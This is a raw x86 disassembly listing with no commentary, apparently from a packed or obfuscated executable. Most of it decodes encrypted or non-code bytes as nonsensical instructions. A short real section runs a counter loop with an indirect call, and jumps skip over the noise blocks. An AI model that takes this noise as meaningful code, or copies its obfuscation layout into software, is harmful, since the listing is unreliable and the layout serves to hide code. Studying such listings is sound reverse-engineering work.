  403fb4:	or     bh,BYTE PTR [ebp-0x152ddfa4]
  403fba:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  403fbc:	inc    ecx
  403fbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fbe:	jo     0x40401a
  403fc0:	inc    edi
  403fc1:	scas   al,BYTE PTR es:[edi]
  403fc2:	xor    BYTE PTR [ebx],cl
  403fc4:	mov    BYTE PTR [edx-0x7b8d25fc],bh
  403fca:	lods   al,BYTE PTR ds:[esi]
  403fcb:	and    al,0xae
  403fcd:	call   0xa6983eca
  403fd2:	mov    dh,0xb0
  403fd4:	jae    0x403f9f
  403fd6:	stos   BYTE PTR es:[edi],al
  403fd7:	inc    edi
  403fd8:	mov    esi,0xe4ddfe
  403fdd:	pop    ebx
  403fde:	push   ss
  403fdf:	mov    cl,0x16
  403fe1:	retf   0x647a
  403fe4:	test   BYTE PTR [eax+0x48],0x3
  403fe8:	inc    eax
  403fe9:	push   ecx
  403fea:	xchg   ecx,eax
  403feb:	inc    ebp
  403fec:	jl     0x40403b
  403fee:	or     DWORD PTR [ebx+0xd11c445],0x7d
  403ff5:	mov    ds:0xc6330042,eax
  403ffa:	mov    ecx,DWORD PTR ds:0x42a35d
  404000:	mov    ebx,DWORD PTR ds:0x42a419
  404006:	sub    ecx,ebx
  404008:	or     ecx,DWORD PTR [ecx+ebx*1]
  40400b:	jmp    0x404516
  404010:	xlat   BYTE PTR ds:[ebx]
  404011:	ror    cl,1
  404013:	aas    
  404014:	leave  
  404015:	rcr    ecx,1
  404017:	rol    BYTE PTR [ecx],1
  404019:	xchg   DWORD PTR ds:0x4d50da3e,edi
  40401f:	push   ds
  404020:	fisub  DWORD PTR [eax+edi*2]
  404023:	js     0x40408f
  404025:	jl     0x40409f
  404027:	js     0x40403a
  404029:	scas   eax,DWORD PTR es:[edi]
  40402a:	cwde   
  40402b:	cwde   
  40402c:	jge    0x404094
  40402e:	xor    bh,BYTE PTR [ecx+0x258c03e5]
  404034:	mov    edx,0xcc25890
  404039:	lods   eax,DWORD PTR ds:[esi]
  40403a:	ss xchg esp,esp
  40403d:	in     eax,dx
  40403e:	sbb    BYTE PTR [esi+0x3b],bh
  404041:	mov    eax,ds:0x8b78560a
  404046:	cwde   
  404047:	lds    esp,FWORD PTR [eax+edx*8-0x34]
  40404b:	addr16 mov ebx,0x96ed69e4
  404051:	sub    al,0x9f
  404053:	mov    edi,0xa5833f5f
  404058:	bound  edi,QWORD PTR [eax-0x35]
  40405b:	jecxz  0x404090
  40405d:	mov    dl,0xc4
  40405f:	cmc    
  404060:	cs or  ecx,eax
  404063:	pop    ds
  404064:	cmp    ecx,DWORD PTR [ecx-0x3e0917f]
  40406a:	lea    esp,[esi-0xd535e24]
  404070:	jmp    0x404065
  404072:	and    ebp,esp
  404074:	push   esp
  404075:	jecxz  0x404033
  404077:	and    eax,0x6139fd09
  40407c:	dec    ebx
  40407d:	gs hlt 
  40407f:	xor    esp,DWORD PTR [esi]
  404081:	ss (bad) 
  404083:	sti    
  404084:	test   DWORD PTR [ebx],edi
  404086:	add    DWORD PTR [esi+0x22b45fea],eax
  40408c:	mov    eax,ds:0xe9e75e45
  404091:	loopne 0x40410c
  404093:	out    dx,eax
  404094:	sidtd  [esi-0x28]
  404098:	call   0x4477eeaf
  40409d:	jmp    0x4040a0
  40409f:	sti    
  4040a0:	jecxz  0x404085
  4040a2:	push   esi
  4040a3:	rcl    DWORD PTR [ecx+0x32052edd],cl
  4040a9:	into   
  4040aa:	into   
  4040ab:	mov    ch,0xc4
  4040ad:	out    dx,eax
  4040ae:	daa    
  4040af:	xchg   esi,eax
  4040b0:	xlat   BYTE PTR ds:[ebx]
  4040b1:	pop    esp
  4040b2:	and    bh,BYTE PTR [eax]
  4040b4:	mov    WORD PTR [edi],gs
  4040b6:	xchg   BYTE PTR [esi],bh
  4040b8:	call   0xadbf:0xaff1bc5d
  4040bf:	push   edx
  4040c0:	(bad)  
  4040c2:	ret    
  4040c3:	mov    al,ds:0xf8676ca0
  4040c8:	adc    bh,BYTE PTR [ebx+edx*8-0x6]
  4040cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040cd:	(bad)  
  4040ce:	mov    esi,0xefa42f91
  4040d3:	das    
  4040d4:	push   eax
  4040d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040d6:	inc    esi
  4040d7:	cs inc edi
  4040d9:	sbb    BYTE PTR ds:0xf0e596a,cl
  4040df:	dec    eax
  4040e0:	mov    eax,0xa14b12ec
  4040e5:	xor    DWORD PTR [ecx+0x6e],esp
  4040e8:	xchg   edi,eax
  4040e9:	push   0x6e5e7208
  4040ee:	test   BYTE PTR [esi+0x77],ah
  4040f1:	or     ecx,DWORD PTR [ecx+edx*4+0xd]
  4040f5:	push   0x12722b6
  4040fa:	ds nop
  4040fc:	ds (bad) 
  4040ff:	sub    DWORD PTR [esi],esi
  404101:	mov    ds:0x45e6fb4f,eax
  404106:	(bad)  
  404107:	push   esp
  404108:	icebp  
  404109:	int3   
  40410a:	ss aaa 
  40410c:	sub    eax,0x7ddb1da
  404111:	popa   
  404112:	and    BYTE PTR [ebp-0x7e568457],dh
  404118:	lods   eax,DWORD PTR ds:[esi]
  404119:	inc    ebx
  40411a:	pop    eax
  40411b:	mov    edx,0xa84e338b
  404120:	sbb    eax,0xadecad83
  404125:	(bad)  
  404126:	shl    bl,1
  404128:	push   esi
  404129:	sub    ch,0xa0
  40412c:	jmp    0x404164
  40412e:	dec    ecx
  40412f:	(bad)  
  404130:	sub    edx,edi
  404132:	rcr    DWORD PTR [ebx-0x78],1
  404135:	rol    BYTE PTR [ebx+esi*2-0x4a40375e],0xb8
  40413d:	push   0xffffff97
  40413f:	int    0x6f
  404141:	imul   esi,DWORD PTR [edi-0x511eb6a6],0x2cc06c4f
  40414b:	aad    0xe5
  40414d:	pushf  
  40414e:	push   ss
  40414f:	push   0xffffff91
  404151:	inc    ecx
  404152:	mov    ss,ebx
  404154:	push   ss
  404155:	cmp    eax,0xf2be557d
  40415a:	sub    esi,DWORD PTR [edi]
  40415c:	inc    ebx
  40415d:	cmc    
  40415e:	int3   
  40415f:	out    dx,eax
  404160:	mov    ebx,0x3c0c17f
  404165:	scas   al,BYTE PTR es:[edi]
  404166:	bnd jg 0x404154
  404169:	pop    ebx
  40416a:	daa    
  40416b:	std    
  40416c:	ror    DWORD PTR [edx-0x22caf9dc],1
  404172:	xchg   ebx,eax
  404173:	fst    DWORD PTR [edx+ecx*1-0x77]
  404177:	cmp    dh,ch
  404179:	js     0x4041ef
  40417b:	adc    edx,DWORD PTR [ecx+0x4d]
  40417e:	ret    
  40417f:	in     al,0xa7
  404181:	jnp    0x404194
  404183:	clc    
  404184:	xchg   edx,eax
  404185:	pop    ebp
  404186:	test   al,0xe6
  404188:	ins    DWORD PTR es:[edi],dx
  404189:	add    eax,0xaa6b4328
  40418e:	sti    
  40418f:	xor    bl,dh
  404191:	jmp    0x404123
  404193:	mov    ecx,0x6de29215
  404198:	push   edx
  404199:	ror    DWORD PTR [edx+ebx*4],1
  40419c:	ss popa 
  40419e:	rol    edx,cl
  4041a0:	adc    ecx,eax
  4041a2:	ror    esi,cl
  4041a4:	jns    0x4041b6
  4041a6:	jmp    0x4041eb
  4041a8:	cmp    al,0x74
  4041aa:	mov    ds,ecx
  4041ac:	fcom   DWORD PTR [di-0x6f]
  4041b0:	gs xor eax,0xb7599a0a
  4041b6:	nop
  4041b7:	and    edi,DWORD PTR [edx]
  4041b9:	enter  0x497b,0x51
  4041bd:	(bad)  [eax+eiz*4+0xe2af012]
  4041c4:	je     0x4041ff
  4041c6:	ins    BYTE PTR es:[edi],dx
  4041c7:	sub    eax,0xb5c822e9
  4041cc:	mov    esp,0x4d015016
  4041d1:	xchg   DWORD PTR ds:0x6be5a70,ecx
  4041d7:	js     0x404231
  4041d9:	push   ds
  4041da:	ins    DWORD PTR es:[edi],dx
  4041db:	pop    esp
  4041dc:	(bad)  
  4041dd:	test   al,0xa7
  4041df:	dec    esi
  4041e0:	xchg   DWORD PTR [ebx+0x691273aa],ebx
  4041e6:	mov    edx,0xae2170d3
  4041eb:	cmp    eax,0xf2860fe
  4041f0:	pop    edi
  4041f1:	mov    WORD PTR [ecx-0x48],dx
  4041f5:	dec    esp
  4041f6:	out    dx,eax
  4041f7:	repnz pushf 
  4041f9:	ror    BYTE PTR [esi],1
  4041fb:	aad    0x4f
  4041fd:	mov    BYTE PTR [edi+0x35fad27a],bl
  404203:	sub    BYTE PTR [ecx],dh
  404205:	data16 je 0x404254
  404208:	sub    BYTE PTR [ebp+0x6776103c],ah
  40420e:	sahf   
  40420f:	out    dx,al
  404210:	xor    al,0x54
  404212:	add    BYTE PTR [esi-0x57],ch
  404215:	loop   0x4041bd
  404217:	test   al,0xf2
  404219:	int3   
  40421a:	aad    0x88
  40421c:	loopne 0x404231
  40421e:	push   es
  40421f:	or     dh,BYTE PTR [ebx]
  404221:	mov    al,dl
  404223:	sbb    BYTE PTR [ebx-0x2c],bh
  404226:	pusha  
  404227:	mov    ds:0x999990b0,al
  40422c:	cmp    dl,dl
  40422e:	cld    
  40422f:	loope  0x404236
  404231:	jb     0x4041c9
  404233:	hlt    
  404234:	lods   al,BYTE PTR ds:[esi]
  404235:	and    esp,DWORD PTR [ebx-0x61acfe50]
  40423b:	test   eax,0xc59bad11
  404240:	mov    al,0xdb
  404242:	xchg   ecx,eax
  404243:	push   ecx
  404244:	jle    0x404260
  404246:	mov    edi,0xf1419c85
  40424b:	or     al,0xad
  40424d:	int3   
  40424e:	in     al,dx
  40424f:	sub    ah,BYTE PTR [edi+0x701cb7db]
  404255:	sbb    eax,0xb3fcc37b
  40425a:	adc    al,0x7a
  40425c:	fwait
  40425d:	pop    eax
  40425e:	mov    ebx,0x73cc8f67
  404263:	xchg   ah,bh
  404265:	scas   eax,DWORD PTR es:[edi]
  404266:	pop    esi
  404267:	pop    ebp
  404268:	push   ebx
  404269:	popa   
  40426a:	cmp    al,0xf2
  40426c:	aam    0xd7
  40426e:	cmp    al,0x9e
  404270:	aad    0xe1
  404272:	pop    eax
  404273:	cmp    esi,ecx
  404275:	xlat   BYTE PTR ds:[ebx]
  404276:	cmc    
  404277:	mov    eax,ds:0xb41410f4
  40427c:	or     ax,0x8ab1
  404280:	dec    eax
  404281:	lock inc ebx
  404283:	call   0x696c:0x792eb4cc
  40428a:	les    esp,FWORD PTR [edx-0x6]
  40428d:	adc    edi,DWORD PTR [edi+0x37]
  404290:	push   ecx
  404291:	mov    DWORD PTR [ebx+0x75],ecx
  404294:	ficom  DWORD PTR [edx]
  404296:	mov    eax,0xaf04e1ec
  40429b:	adc    ecx,DWORD PTR [esi+0x27]
  40429e:	ins    BYTE PTR es:[edi],dx
  40429f:	push   es
  4042a0:	neg    BYTE PTR [edx+0x490df187]
  4042a6:	mov    esp,0xbc0df250
  4042ab:	retf   0xcec1
  4042ae:	sahf   
  4042af:	and    eax,0x683d74b5
  4042b4:	enter  0x91f7,0x45
  4042b8:	sbb    DWORD PTR [esi+eiz*1],ebx
  4042bb:	cmp    eax,0x944c0c8a
  4042c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042c1:	nop
  4042c2:	(bad)  [edx+0x2d34908d]
  4042c8:	out    dx,al
  4042c9:	sub    ecx,edx
  4042cb:	mov    ds:0x9ed1ee1,al
  4042d0:	jp     0x40432c
  4042d2:	sti    
  4042d3:	push   eax
  4042d4:	stos   DWORD PTR es:[edi],eax
  4042d5:	pop    ebx
  4042d6:	cmp    eax,0x9c6b3db0
  4042db:	xchg   ebp,eax
  4042dc:	test   DWORD PTR [eax-0x51f637be],esp
  4042e2:	call   0x399a5587
  4042e7:	sbb    BYTE PTR [ebx],ah
  4042e9:	fadd   QWORD PTR [eax+ebp*4+0x6d]
  4042ed:	test   dl,cl
  4042ef:	lods   al,BYTE PTR ds:[esi]
  4042f0:	sbb    esp,DWORD PTR [esi-0x43098e05]
  4042f6:	es or  dl,dl
  4042f9:	jnp    0x404292
  4042fb:	ins    BYTE PTR es:[edi],dx
  4042fc:	jbe    0x404287
  4042fe:	inc    esp
  4042ff:	or     DWORD PTR es:[ebx-0x7e],eax
  404303:	leave  
  404304:	ss jo  0x4042b3
  404307:	out    dx,al
  404308:	dec    edi
  404309:	not    BYTE PTR [ecx-0x1d]
  40430c:	fst    DWORD PTR [ebp-0x158d6149]
  404312:	sbb    DWORD PTR [ecx+0x6a26db46],esi
  404318:	test   al,0x9
  40431a:	enter  0xa882,0x66
  40431e:	ja     0x4042f4
  404320:	fist   DWORD PTR [ecx+0x10367b42]
  404326:	lock dec eax
  404328:	or     dh,BYTE PTR [edi]
  40432a:	pop    esp
  40432b:	test   BYTE PTR [ecx],bl
  40432d:	and    BYTE PTR [ebx],0x9
  404330:	cmp    ah,ch
  404332:	pop    ebx
  404333:	(bad)  
  404334:	sti    
  404335:	shr    BYTE PTR [edx+0x2a],cl
  404338:	and    BYTE PTR [edx+0x13],bh
  40433b:	les    esi,FWORD PTR [edi-0x10]
  40433e:	xchg   ecx,eax
  40433f:	cmp    eax,0x266f35f9
  404344:	ins    BYTE PTR es:[edi],dx
  404345:	adc    eax,0xee8eb1e7
  40434a:	cli    
  40434b:	std    
  40434c:	xchg   ebx,eax
  40434d:	dec    esi
  40434e:	adc    al,0xcf
  404350:	cmp    eax,0x1be5274
  404355:	les    ebp,FWORD PTR [ecx+0x25]
  404358:	call   0xd374f7ef
  40435d:	out    0x5,eax
  40435f:	inc    esi
  404360:	cld    
  404361:	popa   
  404362:	in     eax,dx
  404363:	pop    ebx
  404364:	test   al,0xad
  404366:	inc    edi
  404367:	jae    0x404370
  404369:	nop
  40436a:	hlt    
  40436b:	std    
  40436c:	and    al,0xf8
  40436e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40436f:	mov    eax,0xe7f0eae3
  404374:	dec    esi
  404375:	mov    WORD PTR [ebx],?
  404377:	scas   eax,DWORD PTR es:[edi]
  404378:	loope  0x4043f6
  40437a:	ja     0x40432c
  40437c:	fdivr  QWORD PTR [ebx+0x34]
  40437f:	jb     0x404308
  404381:	and    DWORD PTR [esi],eax
  404383:	mov    DWORD PTR [edx-0x4c],edi
  404386:	scas   al,BYTE PTR es:[edi]
  404387:	(bad)  
  404388:	pop    ds
  404389:	arpl   WORD PTR ds:0x2c14d43b,di
  40438f:	test   eax,0x7bb3c796
  404394:	mov    al,ds:0x200a278b
  404399:	add    al,0x69
  40439b:	pop    es
  40439c:	inc    esp
  40439d:	mov    WORD PTR [ecx],es
  40439f:	sub    esp,ebx
  4043a1:	push   esi
  4043a2:	inc    edx
  4043a3:	ins    DWORD PTR es:[edi],dx
  4043a4:	xchg   edi,eax
  4043a5:	shr    DWORD PTR [ebp+0x8a7fe78],cl
  4043ab:	xchg   DWORD PTR [esi+0x39],ebp
  4043ae:	adc    ecx,eax
  4043b0:	or     BYTE PTR [ebp-0x75],bl
  4043b3:	je     0x4043e2
  4043b5:	mov    esi,0xe74b0531
  4043ba:	jle    0x404354
  4043bc:	test   al,0x2
  4043be:	scas   al,BYTE PTR es:[edi]
  4043bf:	cmp    eax,0xb3a0e61e
  4043c4:	mov    ah,0x1
  4043c6:	jmp    0x4a03e7cd
  4043cb:	fmul   QWORD PTR [edx]
  4043cd:	ret    
  4043ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043cf:	push   edx
  4043d0:	mov    ch,0xd0
  4043d2:	outs   dx,DWORD PTR ds:[esi]
  4043d3:	clc    
  4043d4:	or     BYTE PTR [edi+ebx*1-0x15],ch
  4043d8:	pop    ss
  4043d9:	test   al,bl
  4043db:	leave  
  4043dc:	loopne 0x4043ab
  4043de:	gs loop 0x40443a
  4043e1:	rcl    DWORD PTR [esi],cl
  4043e3:	xor    eax,0x46f69d43
  4043e8:	aad    0xbe
  4043ea:	mov    ds:0x81c05850,al
  4043ef:	popa   
  4043f0:	lahf   
  4043f1:	cmp    cl,cl
  4043f3:	xchg   esp,eax
  4043f4:	int3   
  4043f5:	sub    DWORD PTR ds:0x747dc431,ebx
  4043fb:	or     cl,BYTE PTR [esi+0xfbee907]
  404401:	aaa    
  404402:	push   esp
  404403:	xor    eax,0xbd2a6017
  404408:	aam    0xe0
  40440a:	popf   
  40440b:	enter  0x5a0b,0x7f
  40440f:	(bad)  
  404410:	fimul  WORD PTR [ecx+0x73]
  404413:	ret    0x8243
  404416:	jg     0x4043a5
  404418:	fmul   DWORD PTR [esi+0x17d8a7b0]
  40441e:	jge    0x404497
  404420:	test   al,0xc8
  404422:	push   0xffffffcd
  404424:	mov    ah,0xb
  404426:	les    ebx,FWORD PTR [edx]
  404428:	dec    edx
  404429:	cs jo  0x4043f6
  40442c:	xchg   esi,eax
  40442d:	cmc    
  40442e:	dec    esp
  40442f:	sbb    ch,bl
  404431:	mov    ebx,?
  404433:	dec    edi
  404434:	mov    al,0x63
  404436:	sub    ebp,DWORD PTR [edi-0x419f1a8a]
  40443c:	fwait
  40443d:	int    0x4a
  40443f:	cmovs  ecx,DWORD PTR [edi-0x72]
  404443:	enter  0x5f87,0x56
  404447:	xor    ebx,eax
  404449:	pop    ebx
  40444a:	sbb    BYTE PTR [eax+ecx*8-0x4a],dh
  40444e:	mov    ?,WORD PTR [edi]
  404450:	pop    ebp
  404451:	out    0x6,al
  404453:	jmp    FWORD PTR ds:0x439a8267
  404459:	pop    es
  40445a:	std    
  40445b:	fnstenv [eax+edx*2]
  40445e:	mov    bh,0x27
  404460:	in     eax,dx
  404461:	jnp    0x40441b
  404463:	jmp    0x60a93cf3
  404468:	xor    ebp,esp
  40446a:	sbb    al,0x65
  40446c:	pop    esi
  40446d:	inc    ebx
  40446e:	or     cl,BYTE PTR [ebx-0x14]
  404471:	daa    
  404472:	mov    ah,0x8c
  404474:	pop    edi
  404475:	mov    eax,0xb851e80c
  40447a:	sbb    bl,0x80
  40447d:	mov    ebx,0x16d99403
  404482:	and    dl,ah
  404484:	inc    ebx
  404485:	nop
  404486:	push   cs
  404487:	inc    esi
  404488:	scas   al,BYTE PTR es:[edi]
  404489:	and    BYTE PTR [esi],bh
  40448b:	inc    ebp
  40448c:	shl    DWORD PTR [esi],cl
  40448e:	push   es
  40448f:	fsubr  st,st(5)
  404491:	jl     0x4044f0
  404493:	cmp    eax,0xafcb7502
  404498:	pop    edx
  404499:	repnz inc DWORD PTR [ebp+0x12]
  40449d:	ds (bad) 
  40449f:	syscall 
  4044a1:	cmp    BYTE PTR [ecx+0x1a38a7a4],bl
  4044a7:	(bad)  
  4044a8:	jmp    0xca9c17fa
  4044ad:	dec    ecx
  4044ae:	hlt    
  4044af:	ror    BYTE PTR [ebx+0x649dbdee],1
  4044b5:	pop    edx
  4044b6:	ss pusha 
  4044b8:	dec    eax
  4044b9:	pop    ds
  4044ba:	and    eax,0x621d693e
  4044bf:	test   DWORD PTR [eax],eax
  4044c1:	sbb    ch,BYTE PTR [eax+0x1d]
  4044c4:	xchg   ecx,eax
  4044c5:	ss test ecx,0x259d4e8a
  4044cc:	rol    DWORD PTR [ebx],0x63
  4044cf:	stos   DWORD PTR es:[edi],eax
  4044d0:	stos   BYTE PTR es:[edi],al
  4044d1:	nop
  4044d2:	pop    ebp
  4044d3:	aad    0xbf
  4044d5:	inc    esp
  4044d6:	or     ebx,DWORD PTR [ebx]
  4044d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044d9:	(bad)
  4044dc:	xchg   ecx,edi
  4044de:	(bad)  
  4044df:	retf   
  4044e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044e1:	shr    esp,cl
  4044e3:	pop    edx
  4044e4:	or     al,0xd2
  4044e6:	push   ebp
  4044e7:	sar    DWORD PTR [esi-0x615f245f],1
  4044ed:	ins    BYTE PTR es:[edi],dx
  4044ee:	dec    ebx
  4044ef:	adc    esp,DWORD PTR [ebp+0x65]
  4044f2:	sbb    ecx,DWORD PTR [eax-0x33]
  4044f5:	sub    eax,0x8d2d589b
  4044fa:	mov    edx,edx
  4044fc:	int3   
  4044fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044fe:	inc    esi
  4044ff:	cmp    edx,DWORD PTR [ebx+ebp*8-0x32]
  404503:	xchg   edx,eax
  404504:	bound  ecx,QWORD PTR [edi]
  404506:	adc    DWORD PTR [edi+0x5e39bed4],esi
  40450c:	or     bh,BYTE PTR [edi-0x5ffee903]
  404512:	std    
  404513:	les    dx,DWORD PTR [ebx]
  404516:	add    eax,edi
  404518:	mov    DWORD PTR [ebp-0x34],eax
  40451b:	mov    eax,DWORD PTR [ebp-0x44]
  40451e:	and    DWORD PTR ds:0x42a3b5,0x0
  404528:	xor    ecx,ecx
  40452a:	add    ecx,DWORD PTR ds:0x42a3b5
  404530:	inc    ecx
  404531:	mov    DWORD PTR ds:0x42a3b5,ecx
  404537:	cmp    DWORD PTR ds:0x42a3b5,0x5
  40453e:	jne    0x40455d
  404544:	push   DWORD PTR [ebp-0x18]
  404547:	push   0x8a8f
  40454c:	push   DWORD PTR [ebp-0x18]
  40454f:	push   0x495a
  404554:	push   DWORD PTR [ebp-0x24]
  404557:	call   DWORD PTR ds:0x42534c
  40455d:	cmp    DWORD PTR ds:0x42a3b5,0x4
  404564:	jne    0x404579
  40456a:	xor    ecx,ecx
  40456c:	add    ecx,DWORD PTR ds:0x42a3b5
  404572:	inc    ecx
  404573:	mov    DWORD PTR ds:0x42a3b5,ecx
  404579:	cmp    DWORD PTR ds:0x42a3b5,0x14
  404580:	jb     0x404528
  404586:	xor    eax,esi
  404588:	jmp    0x404a93
  40458d:	cmp    eax,0xc7cf3fc6
  404592:	aad    0xcd
  404594:	(bad)  
  404595:	dec    esi
  404596:	add    BYTE PTR cs:[ebx+0x46],ch
  40459a:	inc    eax
  40459b:	dec    esi
  40459c:	scas   al,BYTE PTR es:[edi]
  40459d:	les    ebp,FWORD PTR [edi]
  40459f:	js     0x404619
  4045a1:	push   0x7c
  4045a3:	js     0x40461d
  4045a5:	js     0x40454f
  4045a7:	in     al,dx
  4045a8:	jae    0x40460b
  4045aa:	stos   BYTE PTR es:[edi],al
  4045ab:	and    bh,dl
  4045ad:	xor    cl,BYTE PTR [edx+0x7462b135]
  4045b3:	cmp    ecx,DWORD PTR [esi]
  4045b5:	add    al,BYTE PTR [edx]
  4045b7:	add    al,0x6a
  4045b9:	sub    eax,0xa31e80e0
  4045be:	aam    0x6c
  4045c0:	push   ss
  4045c1:	call   DWORD PTR [ecx]
  4045c3:	pop    esp
  4045c4:	xchg   ebx,eax
  4045c5:	pop    DWORD PTR [ecx]
  4045c7:	mov    cl,0x9
  4045c9:	xor    DWORD PTR [esi+0x5e364d18],ebx
  4045cf:	pop    ss
  4045d0:	adc    eax,0xe0ac6e6b
  4045d5:	sbb    DWORD PTR [eax],edx
  4045d7:	pop    ecx
  4045d8:	cld    
  4045d9:	sub    ch,dh
  4045db:	shr    BYTE PTR [edi+0x35c7758],1
  4045e1:	add    al,0x4b
  4045e3:	les    ecx,FWORD PTR [eax+0x18]
  4045e6:	ret    
  4045e7:	leavew 
  4045e9:	std    
  4045ea:	ds cs and ch,al
  4045ee:	add    esi,edx
  4045f0:	cdq    
  4045f1:	shr    esi,1
  4045f3:	adc    DWORD PTR [eax],0x59
  4045f6:	jp     0x404605
  4045f8:	bound  esp,QWORD PTR [ebp+0x64]
  4045fb:	ss dec ecx
  4045fd:	call   0x330:0xe9029b41
  404604:	into   
  404605:	arpl   si,dx
  404607:	(bad)  
  404609:	pop    es
  40460a:	and    eax,0x49f3c42f
  40460f:	push   cs
  404610:	cmp    eax,0x66e44e46
  404615:	repnz push cs
  404617:	adc    BYTE PTR ds:0x2f413a98,0x4e
  40461e:	ins    DWORD PTR es:[edi],dx
  40461f:	inc    edi
  404620:	ja     0xe1b41c98
  404626:	push   0x161d73db
  40462b:	mov    BYTE PTR [eax+edi*1+0x7d],dl
  40462f:	adc    ebx,ebx
  404631:	mov    bl,0xc9
  404633:	cmp    bh,BYTE PTR [ebx-0x1]
  404636:	and    al,BYTE PTR [ecx]
  404638:	or     BYTE PTR [ebx-0x62d58ce7],bh
  40463e:	dec    eax
  40463f:	stos   DWORD PTR es:[edi],eax
  404640:	push   eax
  404641:	out    0x76,al
  404643:	hlt    
  404644:	retf   0x6339
  404647:	pop    ebx
  404648:	icebp  
  404649:	(bad)  
  40464a:	jmp    0xc074:0x21e5e4ac
  404651:	xor    DWORD PTR gs:[eax],esi
  404654:	dec    eax
  404655:	push   0xcce7ea61
  40465a:	and    BYTE PTR [edi-0x31],ah
  40465d:	aam    0xe9
  40465f:	fcom   st(4)
  404661:	adc    dl,BYTE PTR [ebx]
  404663:	pop    ebx
  404664:	repz xchg edi,eax
  404666:	dec    ebx
  404667:	mov    edi,0x47c73fd5
  40466c:	mov    BYTE PTR [eax+eiz*8],cl
  40466f:	fdivr  DWORD PTR [ebp+0xa58401]
  404675:	enter  0x3778,0x9f
  404679:	push   cs
  40467a:	jmp    0x903e5d32
  40467f:	(bad)  
  404680:	bound  edi,QWORD PTR [esi]
  404682:	push   DWORD PTR [ebx+0x6b195f21]
  404688:	push   ss
  404689:	xor    eax,0x28d7aa69
  40468e:	push   ss
  40468f:	cmp    cl,BYTE PTR [edx+0x1a566d4d]
  404695:	xchg   ebp,eax
  404696:	cmp    dh,cl
  404698:	xchg   esp,eax
  404699:	push   esi
  40469a:	mov    ah,0x8e
  40469c:	in     al,dx
  40469d:	cmp    al,0x27
  40469f:	addr16 pop esp
  4046a1:	(bad)  
  4046a2:	mov    ah,0xc0
  4046a4:	add    dh,al
  4046a6:	or     edx,DWORD PTR [ebx-0x21]
  4046a9:	sub    BYTE PTR [edi],dh
  4046ab:	mov    cl,0x1a
  4046ad:	das    
  4046ae:	mov    ecx,DWORD PTR [ecx-0x3e]
  4046b1:	aaa    
  4046b2:	mov    bh,ch
  4046b4:	adc    al,0xb5
  4046b6:	jmp    0x762a3dd8
  4046bb:	jmp    0x43a9:0xf8c352dd
  4046c2:	jle    0x4046d4
  4046c4:	in     al,0xc2
  4046c6:	les    ebx,FWORD PTR [eax+0x61]
  4046c9:	dec    edx
  4046ca:	nop
  4046cb:	mov    BYTE PTR [edi-0x2091a4cf],ah
  4046d1:	imul   esp,DWORD PTR [esi],0xe99fb57f
  4046d7:	leave  
  4046d8:	inc    esi
  4046d9:	cmp    eax,0x66a5e78
  4046de:	sbb    al,0x78
  4046e0:	int    0x95
  4046e2:	jecxz  0x404751
  4046e4:	(bad)  
  4046e5:	push   ecx
  4046e6:	add    dh,dh
  4046e8:	and    BYTE PTR [eax-0x42],al
  4046eb:	(bad)  
  4046ec:	in     eax,0xc3
  4046ee:	cmp    eax,0x6ee0f77
  4046f3:	in     eax,dx
  4046f4:	push   ebx
  4046f5:	fbstp  TBYTE PTR [ecx+0x5eee4906]
  4046fb:	inc    edx
  4046fc:	repnz lea esi,[ecx-0x5e]
  404700:	jae    0x404706
  404702:	test   DWORD PTR [edx+0x5],0xb56c0bdf
  404709:	mov    BYTE PTR [esi+0x50],bh
  40470c:	adc    BYTE PTR [ebx],al
  40470e:	fcomp  QWORD PTR [eax-0x69]
  404711:	push   es
  404712:	sbb    eax,0x627ec21c
  404717:	rcr    BYTE PTR [ebx-0x24924ce],0x3c
  40471e:	icebp  
  40471f:	(bad)  
  404720:	int    0xf7
  404722:	out    dx,eax
  404723:	psubd  mm2,mm5
  404726:	xor    ah,al
  404728:	ret    
  404729:	dec    ebp
  40472a:	jecxz  0x40471c
  40472c:	iret   
  40472d:	jmp    0x27ba8c9e
  404732:	mov    WORD PTR [ebp+0x1184826f],?
  404738:	(bad)  
  40473a:	xlat   BYTE PTR ds:[ebx]
  40473b:	cmp    bh,BYTE PTR [ebx]
  40473d:	inc    ebp
  40473e:	adc    al,0x18
  404740:	mov    esp,0x4e6c2261
  404745:	nop
  404746:	stos   BYTE PTR es:[edi],al
  404747:	call   0xada71750
  40474c:	push   esi
  40474d:	ja     0x404713
  40474f:	ins    DWORD PTR es:[edi],dx
  404750:	nop
  404751:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404752:	in     al,0xb
  404754:	jo     0x404742
  404756:	or     eax,0x4140d39
  40475b:	and    bh,dl
  40475d:	mov    ebp,0xaa5354a4
  404762:	outs   dx,DWORD PTR ds:[esi]
  404763:	pop    edi
  404764:	scas   eax,DWORD PTR es:[edi]
  404765:	ror    BYTE PTR [esi],cl
  404767:	das    
  404768:	pop    ebp
  404769:	sub    DWORD PTR [edx-0x1649a2d5],ecx
  40476f:	pop    ecx
  404770:	pop    ecx
  404771:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404772:	and    al,0x6b
  404774:	pop    ds
  404775:	and    esi,DWORD PTR [edi]
  404777:	sbb    al,0x5b
  404779:	or     al,0x20
  40477b:	in     eax,0xfd
  40477d:	mov    eax,ds:0x7157196e
  404782:	imul   ebp,DWORD PTR [edx+0x681fee9b],0x7a
  404789:	iret   
  40478a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40478b:	xchg   esp,eax
  40478c:	cwde   
  40478d:	mov    al,0x4b
  40478f:	ins    DWORD PTR es:[edi],dx
  404790:	ins    DWORD PTR es:[edi],dx
  404791:	sbb    BYTE PTR [ebp+0x1df09acc],ah
  404797:	xchg   ebx,eax
  404798:	imul   ecx,DWORD PTR [ecx-0x5b6f4932],0x2d
  40479f:	loopne 0x40473e
  4047a1:	and    al,0x65
  4047a3:	sub    edx,DWORD PTR [esi]
